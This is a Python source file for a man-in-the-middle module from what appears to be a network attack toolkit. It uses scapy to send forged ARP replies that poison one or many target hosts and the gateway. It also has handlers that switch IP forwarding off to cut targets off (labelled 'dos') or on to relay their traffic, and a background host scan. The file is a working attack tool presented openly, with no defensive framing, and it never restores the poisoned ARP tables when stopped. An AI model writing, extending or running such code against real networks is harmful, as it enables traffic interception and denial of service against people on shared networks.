"""
Man-in-the-Middle (MITM) Module
Provides methods to ARP poison devices
"""

import sys
import os
# Ensure proper import paths
modules_dir = os.path.dirname(os.path.abspath(__file__))
if modules_dir not in sys.path:
    sys.path.insert(0, modules_dir)
parent_dir = os.path.dirname(modules_dir)
if parent_dir not in sys.path:
    sys.path.insert(0, parent_dir)

# Import with full path for singleton consistency
try:
    from Modules.Network_Modules import network_adapter as iface
    from Modules.Network_Modules import net_tools as network
    from Modules.base_module import BaseModule
    from Modules.message_broker import Message
except ImportError:
    from Network_Modules import network_adapter as iface
    from Network_Modules import net_tools as network
    from base_module import BaseModule
    from message_broker import Message

from scapy.all import *
import scapy.all as scapy
import threading

class MitmModule(BaseModule):
    def __init__(self):
        super().__init__("mitm")
        
        # Module state
        self.is_poisoning = False
        self.target_ip = None
        self.target_mac = "FF:FF:FF:FF:FF:FF"
        self.target_mac_list = None
        self.target_ip_list = None
        self.gateway_ip = None
        self.gateway_mac = None
        self.self_mac = None

        # Register command handlers
        self.register_handler("poison_all", self.handle_poison_all)
        self.register_handler("poison_selected", self.handle_poison_selected)
        self.register_handler("dos", self.handle_dos)
        self.register_handler("passthrough", self.handle_passthrough)
        self.register_handler("get_status", self.handle_get_status)
        self.register_handler("stop", self.handle_stop_poison)
        self.register_handler("scan", self.handle_scan)
    
    def on_start(self):
        """Initialize module"""
        print(f"[{self.module_name}] MITM module initialized")
        
        # Ensure adapter is in managed mode
        if iface.ADAPTER_STATUS == "monitor":
            iface.set_adapter_status("managed")

        # Set gateway info
        self.gateway_ip = network.get_router_ip(iface.ADAPTER_NAME)
        self.gateway_mac = network.get_router_mac(iface.ADAPTER_NAME)
    
    def on_stop(self):
        """Cleanup module"""
        if self.is_poisoning:
            self.stop_poisoning()
    
    # Command Handlers
    
    def handle_poison_all(self, message: Message):
        """Handle poisoning all IPs in the list"""
        self.target_ip_list = message.data.get("target_ips")

        if not self.target_ip_list or len(self.target_ip_list) == 0:
            return {
                "status": "error", 
                "message": "Target IPs required"
            }
        
        if self.is_poisoning:
            return {"status": "error", "message": "Attack already in progress"}
        
        # Ensure managed mode
        if iface.ADAPTER_STATUS == "monitor":
            iface.set_adapter_status("managed")
            self.send_event("status_update", {"status": "adapter_mode_changed", "mode": "managed"})
        
        # Get MAC addresses for all targets
        print(f"[{self.module_name}] Getting MAC addresses for {len(self.target_ip_list)} targets...")
        self.target_mac_list = []
        for target_ip in self.target_ip_list:
            mac = network.get_mac_address(target_ip)
            if mac:
                self.target_mac_list.append(mac)
                print(f"[{self.module_name}] {target_ip} -> {mac}")
            else:
                print(f"[{self.module_name}] Could not get MAC for {target_ip}")
        
        if len(self.target_mac_list) == 0:
            return {
                "status": "error",
                "message": "Could not get MAC addresses for any targets"
            }
        
        # Start poisoning
        self.is_poisoning = True
        poison_thread = threading.Thread(target=self._poison_all_worker, daemon=True)
        poison_thread.start()
        
        return {
            "status": "attack_started",
            "target_count": len(self.target_ip_list),
            "targets_with_mac": len(self.target_mac_list)
        }

    def handle_poison_selected(self, message: Message):
        """Handle poison selection"""
        self.target_ip = message.data.get("target_ip")

        if not self.target_ip:
            return {
                "status": "error",
                "message": "Target IP required"
            }

        if self.is_poisoning:
            return {"status": "error", "message": "Attack already in progress"}

        # Ensure managed mode
        if iface.ADAPTER_STATUS == "monitor":
            iface.set_adapter_status("managed")
            self.send_event("status_update", {"status": "adapter_mode_changed", "mode": "managed"})

        # Start poisoning
        self.is_poisoning = True

        poison_thread = threading.Thread(target=self._poison_worker, daemon=True)
        poison_thread.start()

        return {
            "status": "attack_started",
        }

    def handle_dos(self, message: Message):
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], check=True)

        return {
            "status" : "toggled_dos"
        }

    def handle_passthrough(self, message: Message):
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)

        return {
            "status" : "toggled_passthrough"
        }

    def handle_restore(self, message: Message):
        pass
    
    def _poison_all_worker(self):
        """Background worker for poisoning multiple targets"""
        try:
            self.send_event("attack_status", {
                "status": "poisoning_all",
                "target_count": len(self.target_ip_list),
            })
            
            packet_count = 0
            
            while self.is_poisoning:
                # Send ARP poison to each target
                for i, target_ip in enumerate(self.target_ip_list):
                    if i < len(self.target_mac_list):
                        target_mac = self.target_mac_list[i]
                        
                        # Poison target (tell target that we are the gateway)
                        arp_target = scapy.ARP(
                            op=2,  # ARP reply
                            pdst=target_ip,
                            hwdst=target_mac,
                            psrc=self.gateway_ip,
                            hwsrc=network.get_adapter_mac(iface.ADAPTER_NAME)
                        )
                        scapy.send(arp_target, verbose=False)
                        
                        # Poison gateway (tell gateway that we are the target)
                        arp_gateway = scapy.ARP(
                            op=2,  # ARP reply
                            pdst=self.gateway_ip,
                            hwdst=self.gateway_mac,
                            psrc=target_ip,
                            hwsrc=network.get_adapter_mac(iface.ADAPTER_NAME)
                        )
                        scapy.send(arp_gateway, verbose=False)
                        
                        packet_count += 2
                
                # Send progress update every 100 packets
                if packet_count % 100 == 0:
                    self.send_event("attack_progress", {
                        "packets_sent": packet_count,
                        "targets": len(self.target_ip_list)
                    })
                
                # Small delay to avoid flooding
                import time
                time.sleep(2)
            
            # Attack stopped
            self.send_event("attack_stopped", {
                "total_packets": packet_count
            })
            
        except Exception as e:
            print(f"[{self.module_name}] Poison error: {e}")
            self.send_event("attack_error", {"error": str(e)})
            self.is_poisoning = False
    
    def _poison_worker(self):
        """Background worker for poisoning single target"""
        try:
            self.send_event("attack_status", {
                "status": "poisoning",
                "target": self.target_ip,
            })
            
            # Get target MAC
            target_mac = network.get_mac_address(self.target_ip)
            if not target_mac:
                self.send_event("attack_error", {"error": "Could not get target MAC address"})
                self.is_poisoning = False
                return
            
            while self.is_poisoning:
                # Poison target (tell target that we are the gateway)
                arp_target = scapy.ARP(
                    op=2,
                    pdst=self.target_ip,
                    hwdst=target_mac,
                    psrc=self.gateway_ip,
                    hwsrc=network.get_adapter_mac(iface.ADAPTER_NAME)
                )
                scapy.send(arp_target, verbose=False)
                
                # Poison gateway (tell gateway that we are the target)
                arp_gateway = scapy.ARP(
                    op=2,
                    pdst=self.gateway_ip,
                    hwdst=self.gateway_mac,
                    psrc=self.target_ip,
                    hwsrc=network.get_adapter_mac(iface.ADAPTER_NAME)
                )
                scapy.send(arp_gateway, verbose=False)
            
        except Exception as e:
            print(f"[{self.module_name}] Poison error: {e}")
            self.send_event("attack_error", {"error": str(e)})
            self.is_poisoning = False
    
    def handle_stop_poison(self, message: Message):
        """Stop ARP poisoning"""
        if not self.is_poisoning:
            return {"status": "no_attack_running"}
        
        self.stop_poisoning()
        return {"status": "stopping"}
    
    def stop_poisoning(self):
        """Internal method to stop poisoning"""
        self.is_poisoning = False
        subprocess.run(["sysctl", "net.ipv4.ip_forward"], check=False)
    
    def handle_get_status(self, message: Message):
        """Get current module status"""
        return {
            "is_poisoning": self.is_poisoning,
            "target_ip": self.target_ip,
            "gateway_ip": self.gateway_ip,
            "adapter_mode": iface.ADAPTER_STATUS
        }

    def handle_scan(self, message: Message):
        """Start network scan in background"""
        scan_thread = threading.Thread(target=self._scan_worker, daemon=True)
        scan_thread.start()
        return {
            "status": "scanning_started"
        }

    def _scan_worker(self):
        """Internal method to scan hosts"""
        try:
            print(f"[{self.module_name}] Starting network scan...")
            hosts = network.scan_network(network.get_network_range(iface.ADAPTER_NAME), max_workers=50)
            print(f"[{self.module_name}] Scan complete, found {len(hosts)} hosts")
            self.send_event("scan_completed", {"hosts": hosts})
        except Exception as e:
            print(f"[{self.module_name}] Scan error: {e}")
            self.send_event("scan_error", {"error": str(e)})

# Initialize module (called by bridge)
def init(host_socket):
    """Legacy init function - now handled by bridge"""
    pass

# Global instance
_module = None

def get_module() -> MitmModule:
    global _module
    if _module is None:
        _module = MitmModule()
    return _module
